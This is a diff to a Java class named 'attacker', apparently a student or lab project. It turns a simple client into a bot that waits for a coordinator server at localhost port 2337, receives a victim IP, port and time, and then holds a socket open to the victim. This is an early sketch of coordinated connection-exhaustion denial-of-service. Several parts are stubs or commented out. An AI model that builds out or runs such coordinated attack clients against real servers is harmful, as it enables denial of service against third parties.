@@ -10,19 +10,18 @@ public class attacker {
   private final int MONITORING = 0;
   private final int ATTACKING = 1;
 
-  //configs
-  private int number_of_connection_threads = 1;
-  private String start_time = "";
-  private String attack_length_seconds = "";
-  public static String server_ip_string;
+  private static int state = 0;
 
-  private static int monitoring_port;
-  private static int attacking_port;
-  private static Socket socket;
 
-  private static void parseConfigs() {
+  private static String victim_time = "";
+  private static String victim_ip = "";
+  private static String victim_port = "";
 
-  }
+
+  public static String coordinator_ip_string = "127.0.0.1";
+  private static int coordinator_port = 2337;
+
+  private boolean retry_connection_to_coordinator = false;
 
   private static Calendar convertStringToTime(String time) {
     SimpleDateFormat sf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
@@ -50,20 +49,82 @@ public class attacker {
     return null;
   }
 
-  private static void openConnection(String attacking_ip, int attacking_port) {
-    Inet4Address server_ip_inet;
+  /*
+    Constantly check if an attack server is online.
+  */
+  private static void waitForAttackServer() {
+    int waiting_time = 1 * 1000;
+    while (true) {
+      try (Socket s = new Socket(coordinator_ip_string, coordinator_port)) {
+        s.close();
+        return;
+      } catch (IOException e) {}
+      System.out.println("Coordinating Server not online, retrying in " + (waiting_time/1000) + " seconds");
+      try { Thread.sleep(waiting_time); } catch (Exception e) {}
+    }
+  }
+
+  /*
+    Wait until the attack time is here.
+  */
+  private static void waitForAttack() {
+
+  }
+
+  /*
+    get the required information from the attack server before attacking.
+  */
+  private static void getInfoFromCoordinator() throws UnknownHostException{
+    Inet4Address coordinator_ip_inet = (Inet4Address) Inet4Address.getByAddress(convertStringToByteArrayIP(coordinator_ip_string));
+    Socket socket;
 
     try {
-      server_ip_inet = (Inet4Address) Inet4Address.getByAddress(convertStringToByteArrayIP(attacking_ip));
+      socket = new Socket(coordinator_ip_inet, coordinator_port);
+      PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
+      BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
+
+      BufferedReader stdIn = new BufferedReader(new InputStreamReader(System.in));
+      String fromServer;
+      String fromUser;
+
+      int state = 0;
+      while ((fromServer = in.readLine()) != null) {
+        if (state == 0) {}
+        else if (state == 1) {
+          victim_ip = fromServer;
+        } else if (state == 2) {
+          victim_port = fromServer;
+        } else if (state == 3) {
+          victim_time = fromServer;
+        }
+        state++;
+        if (fromServer.equals("Bye.")) {
+          out.println("Bye.");
+          break;
+        }
+      }
+      System.out.println("Here it is: " + victim_ip + ", " + victim_port + ", " + victim_time);
+    } catch (IOException e) {}
+  }
+
+
+  private static void attackServer() {
+    Inet4Address server_ip_inet;
+    Socket socket;
+    try {
+      server_ip_inet = (Inet4Address) Inet4Address.getByAddress(convertStringToByteArrayIP(victim_ip));
     } catch (Exception e) {
       System.out.println("Invalid Host name");
       return;
     }
 
     try {
-      socket = new Socket(server_ip_inet, attacking_port);
+      socket = new Socket(server_ip_inet, Integer.parseInt(victim_port));
+      while (socket.getInputStream().read() != -1 ){}
+      socket.close();
+      System.out.println("Socket was closed");
     } catch (IOException e) {
-      System.err.println("Couldn't get I/O for the connection to " + attacking_ip + " on port " + attacking_port );
+      System.err.println("Couldn't get I/O for the connection to " + victim_ip + " on port " + victim_port );
       System.exit(1);
     }
   }
@@ -80,16 +141,41 @@ public class attacker {
     return final_byte_array;
   } //end convertStringToByteArrayIP()
 
+  private static void startAttack() {
+    waitForAttack();
+    attackServer();
+  }
+
+  private static void startMonitor() {
+    waitForAttackServer();
+    try {
+      getInfoFromCoordinator();
+    } catch (Exception e) {}
+  }
+
+
   public static void main(String[] args) throws IOException {
     //two modes, monitoring mode, and attacking mode.
     //monitoring mode
       //get the information from the coordinator
       //parse information, including converting the IP to a byte array.
     //attack mode.
-    openConnection("127.0.0.1", 1337);
-    while (socket.getInputStream().read() != -1 ){}
-    socket.close();
-    System.out.println("Socket was closed");
+    /*
+    while (true) {
+      if (STATE == MONITORING) {
+
+      } else if (STATE == ATTACKING) {
+        ExecutorService executor = Executors.newSingleThreadExecutor();
+        executor.invokeAll(Arrays.asList(new MyTask()));
+        executor.shutdown();
+      }
+    }
+    */
+
+
+    //attackServer("127.0.0.1", 1337);
+    startMonitor();
+
     System.out.println(convertStringToTime("07:07:07").getTime());
   }
 }
